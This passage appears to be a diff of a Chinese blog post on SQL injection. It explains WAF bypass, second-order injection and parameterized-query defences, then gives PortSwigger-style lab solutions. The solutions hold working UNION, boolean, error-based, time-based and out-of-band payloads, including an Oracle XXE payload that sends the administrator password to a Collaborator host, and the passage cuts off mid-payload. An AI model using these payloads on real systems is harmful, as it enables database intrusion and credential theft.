+&lt;/div&gt;&lt;p&gt;你可以用Burp Collaborator生成唯一的子域名，然后轮询Collaborator服务器，确认DNS查询是否发生。&lt;/p&gt;
+&lt;h3 id=&#34;其他环境下的-sql-注入&#34;&gt;其他环境下的 SQL 注入
+&lt;/h3&gt;&lt;p&gt;实际上，只要应用会将你可控制的输入作为SQL查询处理，任何这类输入都能用于实施SQL注入攻击。例如，部分网站会接收JSON或XML格式的输入，并利用这些输入查询数据库。&lt;/p&gt;
+&lt;p&gt;这些不同的格式能为你提供多种&lt;strong&gt;混淆攻击的方法&lt;/strong&gt;，以绕过原本会被WAF（Web应用防火墙）及其他防御机制拦截的攻击。许多防御机制的实现较为薄弱，仅通过在请求中搜索常见的SQL注入关键字（如&lt;code&gt;SELECT&lt;/code&gt;、&lt;code&gt;UNION&lt;/code&gt;）进行拦截，因此你可以通过对禁用关键字中的字符进行&lt;strong&gt;编码或转义&lt;/strong&gt;，绕过这类过滤。例如，以下基于XML的SQL注入就使用了XML转义序列对&lt;code&gt;SELECT&lt;/code&gt;中的&lt;code&gt;S&lt;/code&gt;字符进行编码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;123&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;999 &lt;span class=&#34;ni&#34;&gt;&amp;amp;#x53;&lt;/span&gt;ELECT * FROM information_schema.tables&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该转义字符会在&lt;strong&gt;服务器端被解码&lt;/strong&gt;后，再传递给SQL解释器执行。&lt;/p&gt;
+&lt;h3 id=&#34;二阶注入&#34;&gt;二阶注入
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一阶SQL注入&lt;/strong&gt;指应用程序处理HTTP请求中的用户输入时，以不安全的方式将输入直接拼接到SQL查询中，导致漏洞触发。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;二阶SQL注入&lt;/strong&gt;则是指应用程序先接收HTTP请求中的用户输入并存储（通常存入数据库），但数据存储阶段并不存在漏洞；后续处理另一个HTTP请求时，应用程序&lt;strong&gt;从存储中读取该数据&lt;/strong&gt;，却以不安全的方式将其拼接到SQL查询中，最终触发注入。因此，二阶SQL注入也被称为&lt;strong&gt;存储型SQL注入&lt;/strong&gt;（stored SQL injection）。&lt;/p&gt;
+&lt;p&gt;二阶SQL注入的典型场景是：开发者已知一阶注入的风险，因此在数据&lt;strong&gt;首次存储&lt;/strong&gt;时做了安全处理（如转义、参数化查询）；但后续读取该数据时，错误地认为“已存入数据库的数据是安全可信的”，未做任何安全校验就直接用于SQL查询，最终因这种“信任误用”导致漏洞。&lt;/p&gt;
+&lt;p&gt;典型场景示例&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;用户注册场景&lt;/strong&gt;：
+注册时输入用户名 &lt;code&gt;admin&#39;--&lt;/code&gt;，应用程序用参数化查询将其安全存入数据库（存储内容为 &lt;code&gt;admin&#39;--&lt;/code&gt;）；&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;后台用户查询场景&lt;/strong&gt;：
+管理员在后台查询用户信息时，应用程序读取数据库中的用户名，以不安全方式拼接SQL：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$stored_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;拼接后实际执行的SQL为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注释符 &lt;code&gt;--&lt;/code&gt; 导致后续语句被忽略，实现越权查询。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;防范注入&#34;&gt;防范注入
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;核心方案：参数化查询（预处理语句）&lt;/strong&gt;
+用占位符&lt;code&gt;?&lt;/code&gt;替代直接字符串拼接，将SQL查询结构与用户输入数据彻底分离，数据库会自动转义特殊字符，从根源杜绝注入。这是处理&lt;strong&gt;数据层面输入&lt;/strong&gt;（WHERE条件、INSERT/UPDATE值）的最优解。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;局限性与替代方案&lt;/strong&gt;
+参数化查询无法用于SQL&lt;strong&gt;结构层面&lt;/strong&gt;（表名、列名、ORDER BY子句）。此类场景需：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;白名单校验：仅允许预设的合法值；&lt;/li&gt;
+&lt;li&gt;逻辑重构：通过业务逻辑绕开用户输入直接参与SQL结构。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;关键原则&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;硬编码SQL常量：参数化查询的SQL语句必须是固定常量，不包含任何变量；&lt;/li&gt;
+&lt;li&gt;拒绝主观信任：无论数据来源（用户输入、数据库存储数据），均不直接拼接，避免二阶注入等风险；&lt;/li&gt;
+&lt;li&gt;禁用选择性拼接：不凭经验判断“数据是否安全”，彻底杜绝字符串拼接的使用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;labs-题解&#34;&gt;Labs 题解
+&lt;/h2&gt;&lt;h3 id=&#34;union-攻击-1&#34;&gt;Union 攻击
+&lt;/h3&gt;&lt;h4 id=&#34;常规&#34;&gt;常规
+&lt;/h4&gt;&lt;p&gt;注入点：&lt;code&gt;/filter?category=Corporate+gifts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;题目要求用 NULL 查询，所以闭合引号后，逐步添加 NULL 即可。payload &lt;code&gt;&#39;+UNION+SELECT+NULL,NULL,NULL--&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;找可用列&#34;&gt;找可用列
+&lt;/h4&gt;&lt;p&gt;注入点：&lt;code&gt;/filter?category=Clothing%2c+shoes+and+accessories&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先出列数 &lt;code&gt;&#39;+ORDER+BY+3--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;题目说 &lt;code&gt;Make the database retrieve the string: &#39;iIwJ8H&#39;&lt;/code&gt; 所以用 &lt;code&gt;&#39;iIwJ8H&#39;&lt;/code&gt; 逐个替换 NULL 查询即可。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;感觉有点奇怪的判断……&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;拼接字符串&#34;&gt;拼接字符串
+&lt;/h4&gt;&lt;p&gt;注入点：&lt;code&gt;/filter?category=Gifts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先判断列数：发现只有两列，而且只有一列是 string：&lt;code&gt;&#39;+UNION+SELECT+NULL,&#39;abc&#39;--&lt;/code&gt;,所以得考虑将 username 和 password 拼接起来&lt;/p&gt;
+&lt;p&gt;payload：&lt;code&gt;&#39;+UNION+SELECT++NULL,username||&#39;~&#39;||password+FROM+users--&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;数据库查询&#34;&gt;数据库查询
+&lt;/h3&gt;&lt;h4 id=&#34;普通查询&#34;&gt;普通查询
+&lt;/h4&gt;&lt;p&gt;注入点：&lt;code&gt;/filter?category=Gifts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先判断列数：发现 &lt;code&gt;&#39;UNION+SELECT+NULL,NULL--&lt;/code&gt; 不管多少都查询错误，考虑可能是数据库不一样，换成了 &lt;code&gt;&#39;UNION+SELECT+NULL,NULL#--&lt;/code&gt; ，查询成功，然后查询指定列即可。&lt;/p&gt;
+&lt;h4 id=&#34;查表列名&#34;&gt;查表、列名
+&lt;/h4&gt;&lt;p&gt;注入点：&lt;code&gt;/filter?category=Gifts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先判断列数：&lt;code&gt;&#39;+ORDER+BY+2&lt;/code&gt; 两列&lt;/p&gt;
+&lt;p&gt;1.查表名，这里出了问题。一开始的查询：&lt;code&gt;&#39;+UNION+SELECT+*,+NULL+FROM+information_schema.tables--&lt;/code&gt;，如果用通配符的话，会导致列数的不匹配！需要直接指定列名：&lt;code&gt;&#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--&lt;/code&gt;，发现特殊表 &lt;code&gt;users_inatpk&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.查列名，&lt;code&gt;&#39;+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name=&#39;users_inatpk&#39;&lt;/code&gt;,查询 information_schema.columns 表，需要指定对应的表名，否则结果很多，发现列名 &lt;code&gt;password_xzxkya&lt;/code&gt; &lt;code&gt;username_rxlzlc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;3.查数据，&lt;code&gt;&#39;+UNION+SELECT+username_rxlzlc,password_xzxkya+FROM+users_inatpk--&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;盲注-1&#34;&gt;盲注
+&lt;/h3&gt;&lt;h4 id=&#34;布尔盲注&#34;&gt;布尔盲注
+&lt;/h4&gt;&lt;p&gt;1.注入点：&lt;code&gt;Cookie: TrackingId=ZVcenZbEGyKbb2Nc&lt;/code&gt;，用 &lt;code&gt;&#39; and &#39;1&#39; =&#39;1&lt;/code&gt; 来判断一下是否存在布尔盲注，发现查询成功的话会返回 &lt;code&gt;Welcome&lt;/code&gt; 字段。&lt;/p&gt;
+&lt;p&gt;2.检验：&lt;code&gt;&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a&lt;/code&gt; 来判断 users 表是否存在。这里的思路是 select 出一个恒等的字符串来验证，后面方便拼接进语句。&lt;/p&gt;
+&lt;p&gt;3.查长度：&lt;code&gt;&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; and length(password)&amp;gt;1)=&#39;a&lt;/code&gt; 确定存在，然后 &lt;code&gt;&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; and length(password)=20)=&#39;a&lt;/code&gt; 确定有 20 位&lt;/p&gt;
+&lt;p&gt;4.查各个位数：手动查显然太麻烦了，这里用 Burp 的 Intruder 可以半自动查询。语句为&lt;code&gt; &#39; and (select substring(password,1,1) from users where username=&#39;administrator&#39;) = &#39;a&lt;/code&gt;,把最后的 a 设为爆破点，然后手动调整 (password,num,1) 进行爆破。&lt;/p&gt;
+&lt;p&gt;5.记录：birxocztgrtwf7ugbhw3&lt;/p&gt;
+&lt;h4 id=&#34;条件盲注&#34;&gt;条件盲注
+&lt;/h4&gt;&lt;p&gt;1.判断注入点：&lt;code&gt;Cookie: TrackingId=y0chXfk5EGo4lz1o&lt;/code&gt;，&lt;code&gt;&#39;&lt;/code&gt; 报错，&lt;code&gt;&#39;&#39;&lt;/code&gt; 不报错，从而确定是 SQL 语法报错注入。&lt;/p&gt;
+&lt;p&gt;2.判断数据库类型：&lt;code&gt;&#39;||(SELECT &#39;&#39;)||&#39;&lt;/code&gt; 报错，&lt;code&gt;&#39;||(SELECT &#39;&#39; FROM dual)||&#39;&lt;/code&gt; 不报错，从而判断是 Oracle&lt;/p&gt;
+&lt;p&gt;3.验证目标表存在：&lt;code&gt;&#39;||(SELECT &#39;&#39; FROM not-a-real-table)||&#39;&lt;/code&gt; 报错，&lt;code&gt;&#39;||(SELECT &#39;&#39; FROM users WHERE ROWNUM = 1)||&#39;&lt;/code&gt; 不报错&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这里用 ROENUM 类似 limit，为的是方式返回多行结果&lt;/p&gt;
+&lt;p&gt;总体思路就是通过字符串拼接来测试报错&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;4.条件判断可行性：&lt;code&gt;&#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39;&lt;/code&gt; 不报错，而改成 &lt;code&gt;1=2&lt;/code&gt; 报错（除零），故可行。&lt;/p&gt;
+&lt;p&gt;5.出长度：&lt;code&gt;&#39;||(SELECT CASE WHEN LENGTH(password)&amp;gt;1 THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;6.出密码：&lt;code&gt;&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;a&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&lt;/code&gt; 和前面一样，Intruder 枚举 &lt;code&gt;a&lt;/code&gt;，手动改第一个 1 即可&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;用 cluster bomb 更简单。sqlmap 不会用。&lt;/p&gt;
+&lt;p&gt;技巧是全部扫完后，多选 - 高亮指定length - 排序。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;报错信息泄露&#34;&gt;报错信息泄露
+&lt;/h4&gt;&lt;p&gt;1.注入点：&lt;code&gt;Cookie: TrackingId=B8kZGghEST0pmL5o&lt;/code&gt;，加一个&lt;code&gt;&#39;&lt;/code&gt;，发现报错：&lt;code&gt;Unterminated string literal started at position&lt;/code&gt;，考虑信息泄露&lt;/p&gt;
+&lt;p&gt;2.测试报错：&lt;code&gt;&#39; and cast((select 1) as int)--&lt;/code&gt;,报错&lt;code&gt;ERROR: argument of AND must be type boolean, not type integer&lt;/code&gt;，验证。&lt;code&gt;&#39; AND 1=CAST((SELECT 1) AS int)--&lt;/code&gt;，不报错，是可以用的。&lt;code&gt;&#39; AND 1=CAST((SELECT username FROM users) AS int)--&lt;/code&gt; 但是这样子又变成了最开始的报错，考虑是&lt;strong&gt;输入被截断&lt;/strong&gt;了！！&lt;/p&gt;
+&lt;p&gt;3.解决截断：&lt;code&gt;&#39; AND 1=CAST((SELECT username FROM users) AS int)--&lt;/code&gt;，报错变成&lt;code&gt;ERROR: more than one row returned by a subquery used as an expression&lt;/code&gt;，再改成 &lt;code&gt;&#39; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--&lt;/code&gt;,报错&lt;code&gt;ERROR: invalid input syntax for type integer: &amp;quot;administrator&amp;quot;&lt;/code&gt;，成功出用户名！&lt;/p&gt;
+&lt;p&gt;4.出密码：&lt;code&gt;&#39; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;时间盲注&#34;&gt;时间盲注
+&lt;/h4&gt;&lt;p&gt;1.注入点判断：&lt;code&gt;Cookie: TrackingId=x&lt;/code&gt;,添加&lt;code&gt;&#39;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--&lt;/code&gt;，对比&lt;code&gt;&#39;%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--&lt;/code&gt; 发现延时，有时间盲注。这里的 &lt;code&gt;%3B&lt;/code&gt; 是分号，防止 burp 识别成两个参数。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;pg_sleep(n)&lt;/code&gt;的函数类型&lt;/strong&gt;：&lt;code&gt;pg_sleep&lt;/code&gt;是 PostgreSQL 的 &lt;strong&gt;“延迟函数”&lt;/strong&gt;，返回值类型为&lt;code&gt;void&lt;/code&gt;（无返回值），它的作用是&lt;strong&gt;暂停当前数据库会话的执行 &lt;strong&gt;，仅能在&lt;code&gt;SELECT&lt;/code&gt;语句的&lt;/strong&gt;选择列表&lt;/strong&gt;（&lt;code&gt;SELECT 列/函数&lt;/code&gt;）中执行，&lt;strong&gt;无法作为&lt;code&gt;WHERE&lt;/code&gt;子句的条件表达式&lt;/strong&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;2.验证条件：&lt;code&gt;&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;3.出长度：&lt;code&gt;&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+LENGTH(password)&amp;gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;4.出密码：&lt;code&gt;&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+SUBSTRING(password,1,1)=&#39;a&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Intruder 里爆破，为了保证有效性，需要在 Resource Pool 里把线程数调整为 1，这样会串行发送请求（否则会同时发送n个，导致共同阻塞）。同时，看结果是需要开启顶栏 - columns - Response Received&lt;/p&gt;
+&lt;p&gt;Cluster Bomp用不了，只能手动调整数字，然后爆破字母，可以用多线程。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;带外盲注&#34;&gt;带外盲注
+&lt;/h4&gt;&lt;p&gt;1.注入点：&lt;code&gt;Cookie: TrackingId=VKVwX08YULpCF0yM&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.尝试带外：&lt;code&gt;&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&amp;lt;%3fxml+version%3d&amp;quot;1.0&amp;quot;+encoding%3d&amp;quot;UTF-8&amp;quot;%3f&amp;gt;&amp;lt;!DOCTYPE+root+[+&amp;lt;!ENTITY+%25+remote+SYSTEM+&amp;quot;http://255pds2evbd16n9qqk51tr8fu60xoncc.oastify.com&amp;quot;&amp;gt;+%25remote%3b]&amp;gt;&#39;),&#39;/l&#39;)+FROM+dual--&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;payload讲解：&lt;/p&gt;
+&lt;p&gt;该语句的关键是&lt;strong&gt;利用 Oracle 的 XML 外部实体注入（XXE）特性触发带外 HTTP 请求&lt;/strong&gt;，流程如下&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;闭合并拼接联合查询&lt;/strong&gt;：通过单引号&lt;code&gt;&#39;&lt;/code&gt;闭合原始 SQL 的字符串，再用&lt;code&gt;UNION SELECT&lt;/code&gt;拼接恶意查询，确保整体 SQL 语法合法。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;构造 XML 类型数据&lt;/strong&gt;：&lt;code&gt;xmltype(...)&lt;/code&gt;将包含外部实体的 XML 字符串转换为 &lt;strong&gt;Oracle 可解析&lt;/strong&gt;的 XML 对象。&lt;/li&gt;
+&lt;li&gt;解析外部实体触发带外请求：
+&lt;ul&gt;
+&lt;li&gt;当 Oracle 解析 XML 中的&lt;code&gt;%remote;&lt;/code&gt;实体时，会根据&lt;code&gt;SYSTEM&lt;/code&gt;指定的&lt;code&gt;http://BURP-COLLABORATOR-SUBDOMAIN/&lt;/code&gt;发起&lt;strong&gt;HTTP 请求&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;即使该 HTTP 请求无返回数据，Burp Collaborator 服务器也能捕获到这个请求，证明注入语句被执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;补全语法并执行&lt;/strong&gt;：&lt;code&gt;EXTRACTVALUE&lt;/code&gt;和&lt;code&gt;FROM dual&lt;/code&gt;补全 Oracle 的查询语法，让整个语句顺利执行，无语法错误。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在 Oracle 数据库的带外注入中，&lt;strong&gt;无法直接通过常规 SQL 语法发起 HTTP 请求&lt;/strong&gt;，必须借助 XML 相关函数（如&lt;code&gt;xmltype&lt;/code&gt;+&lt;code&gt;EXTRACTVALUE&lt;/code&gt;）间接实现，核心原因是&lt;strong&gt;Oracle 本身没有内置的原生 HTTP 请求函数&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;plus&lt;/p&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fxml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http%3a//&amp;#39;||(SELECT+password+FROM+users+WHERE+username%3d&amp;#39;administrator&amp;#39;)||&amp;#39;.BURP-COLLABORATOR-SUBDOMAIN/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span 